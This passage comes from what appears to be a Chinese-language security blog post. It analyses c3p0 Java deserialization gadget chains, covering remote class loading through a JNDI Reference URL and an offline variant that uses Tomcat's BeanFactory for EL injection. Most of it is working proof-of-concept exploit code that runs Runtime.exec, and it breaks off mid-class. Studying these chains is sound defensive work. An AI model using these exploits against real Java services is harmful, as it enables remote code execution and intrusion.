+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">org</span><span class="p">.</span><span class="nx">example</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">com</span><span class="p">.</span><span class="nx">mchange</span><span class="p">.</span><span class="nx">v2</span><span class="p">.</span><span class="nx">c3p0</span><span class="p">.</span><span class="nx">impl</span><span class="p">.</span><span class="nx">PoolBackedDataSourceBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">NamingException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">Reference</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">Referenceable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">ConnectionPoolDataSource</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">PooledConnection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">SQLException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">SQLFeatureNotSupportedException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">logging</span><span class="p">.</span><span class="nx">Logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">c3p0</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">class</span> <span class="nx">exp</span> <span class="nx">implements</span> <span class="nx">ConnectionPoolDataSource</span><span class="p">,</span> <span class="nx">Referenceable</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">Reference</span> <span class="nf">getReference</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">NamingException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">new</span> <span class="nf">Reference</span><span class="p">(</span><span class="s">&#34;exp&#34;</span><span class="p">,</span><span class="s">&#34;exp&#34;</span><span class="p">,</span><span class="s">&#34;http://127.0.0.1:10999/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">PooledConnection</span> <span class="nf">getPooledConnection</span><span class="p">(</span><span class="nx">String</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">String</span> <span class="nx">password</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">PooledConnection</span> <span class="nf">getPooledConnection</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">PrintWriter</span> <span class="nf">getLogWriter</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">void</span> <span class="nf">setLogWriter</span><span class="p">(</span><span class="nx">PrintWriter</span> <span class="nx">out</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">void</span> <span class="nf">setLoginTimeout</span><span class="p">(</span><span class="kt">int</span> <span class="nx">seconds</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="kt">int</span> <span class="nf">getLoginTimeout</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">Logger</span> <span class="nf">getParentLogger</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLFeatureNotSupportedException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">PoolBackedDataSourceBase</span> <span class="nx">pds</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">PoolBackedDataSourceBase</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//将connectionPoolDataSource属性值设为恶意的class
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">Class</span> <span class="nx">cl</span> <span class="p">=</span> <span class="nx">Class</span><span class="p">.</span><span class="nf">forName</span><span class="p">(</span><span class="s">&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Field</span> <span class="nx">connectionPoolDataSourceField</span> <span class="p">=</span> <span class="nx">cl</span><span class="p">.</span><span class="nf">getDeclaredField</span><span class="p">(</span><span class="s">&#34;connectionPoolDataSource&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">connectionPoolDataSourceField</span><span class="p">.</span><span class="nf">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">connectionPoolDataSourceField</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">pds</span><span class="p">,</span> <span class="nx">new</span> <span class="nf">exp</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">Unser</span><span class="p">(</span><span class="nx">pds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">Unser</span><span class="p">(</span><span class="nx">Object</span> <span class="nx">obj</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span><span class="p">,</span> <span class="nx">ClassNotFoundException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ByteArrayOutputStream</span> <span class="nx">bos</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ByteArrayOutputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ObjectOutputStream</span> <span class="nx">oos</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectOutputStream</span><span class="p">(</span><span class="nx">bos</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">oos</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ByteArrayInputStream</span> <span class="nx">bis</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ByteArrayInputStream</span><span class="p">(</span><span class="nx">bos</span><span class="p">.</span><span class="nf">toByteArray</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ObjectInputStream</span> <span class="nx">ois</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectInputStream</span><span class="p">(</span><span class="nx">bis</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ois</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.IOException;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class exp {
+</span></span><span class="line"><span class="cl">    public exp() throws IOException {
+</span></span><span class="line"><span class="cl">        Runtime.getRuntime().exec(&#34;calc&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="总结" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>调用链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PoolBackedDataSourceBase#readObject 
+</span></span><span class="line"><span class="cl">	-&gt;ReferenceSerialized#getObject 
+</span></span><span class="line"><span class="cl">		-&gt;ReferenceableUtils#referenceToObject 
+</span></span><span class="line"><span class="cl">			-&gt;ObjectFactory#getObjectInstance</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是加载个远程恶意类</p>
+<h3 id="不出网利用" class="heading-element"><span>不出网利用</span>
+  <a href="#%e4%b8%8d%e5%87%ba%e7%bd%91%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>环境搭建</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">    &lt;version&gt;8.5.27&lt;/version&gt;
+</span></span><span class="line"><span class="cl">&lt;/dependency&gt;
+</span></span><span class="line"><span class="cl">&lt;dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">    &lt;version&gt;8.5.27&lt;/version&gt;
+</span></span><span class="line"><span class="cl">&lt;/dependency&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="调用链-1" class="heading-element"><span>调用链</span>
+  <a href="#%e8%b0%83%e7%94%a8%e9%93%be-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>和 url 链一样，不过最后不是通过 URLClassLoader 加载远程类了，而是直接加载本地字节码</p>
+<p>回到<code>com.mchange.v2.naming</code> 下的 <code>ReferenceableUtils.referenceToObject</code>中</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/19/67dad77585bbb.png" alt="image-20250319220656007" srcset="https://bu.dusays.com/2025/03/19/67dad77585bbb.png?size=small, https://bu.dusays.com/2025/03/19/67dad77585bbb.png?size=medium 1.5x, https://bu.dusays.com/2025/03/19/67dad77585bbb.png?size=large 2x" data-title="image-20250319220656007" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到这里如果<code>getFactoryClassLocation</code>方法返回为null的时候就直接加载本地字节码</p>
+<p>加载本地字节码的类要求其实现了 javax.naming.spi.ObjectFactory 接口，并能调用<code>getObjectInstance</code>方法，可以通过加载 <code>Tomcat8</code> 中的 <code>org.apache.naming.factory.BeanFactory</code> 进行 EL 表达式注入</p>
+<h4 id="poc-1" class="heading-element"><span>poc</span>
+  <a href="#poc-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>改下 url 链子中的，修改下返回的 Reference ，打 el 表达式注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">org</span><span class="p">.</span><span class="nx">example</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">com</span><span class="p">.</span><span class="nx">mchange</span><span class="p">.</span><span class="nx">v2</span><span class="p">.</span><span class="nx">c3p0</span><span class="p">.</span><span class="nx">impl</span><span class="p">.</span><span class="nx">PoolBackedDataSourceBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">ResourceRef</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">NamingException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">Reference</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">Referenceable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">naming</span><span class="p">.</span><span class="nx">StringRefAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">ConnectionPoolDataSource</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">PooledConnection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">SQLException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="nx">SQLFeatureNotSupportedException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">logging</span><span class="p">.</span><span class="nx">Logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">c3p0_tomcat</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">class</span> <span class="nx">exp</span> <span class="nx">implements</span> <span class="nx">ConnectionPoolDataSource</span><span class="p">,</span> <span class="nx">Referenceable</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">Reference</span> <span class="nf">getReference</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">NamingException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">ResourceRef</span> <span class="nx">resourceRef</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ResourceRef</span><span class="p">(</span><span class="s">&#34;javax.el.ELProcessor&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nx">null</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="s">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nx">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">resourceRef</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">new</span> <span class="nf">StringRefAddr</span><span class="p">(</span><span class="s">&#34;forceString&#34;</span><span class="p">,</span> <span class="s">&#34;faster=eval&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">resourceRef</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">new</span> <span class="nf">StringRefAddr</span><span class="p">(</span><span class="s">&#34;faster&#34;</span><span class="p">,</span> <span class="s">&#34;Runtime.getRuntime().exec(\&#34;calc.exe\&#34;)&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">resourceRef</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">PooledConnection</span> <span class="nf">getPooledConnection</span><span class="p">(</span><span class="nx">String</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">String</span> <span class="nx">password</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">PooledConnection</span> <span class="nf">getPooledConnection</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">PrintWriter</span> <span class="nf">getLogWriter</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">void</span> <span class="nf">setLogWriter</span><span class="p">(</span><span class="nx">PrintWriter</span> <span class="nx">out</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">void</span> <span class="nf">setLoginTimeout</span><span class="p">(</span><span class="kt">int</span> <span class="nx">seconds</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
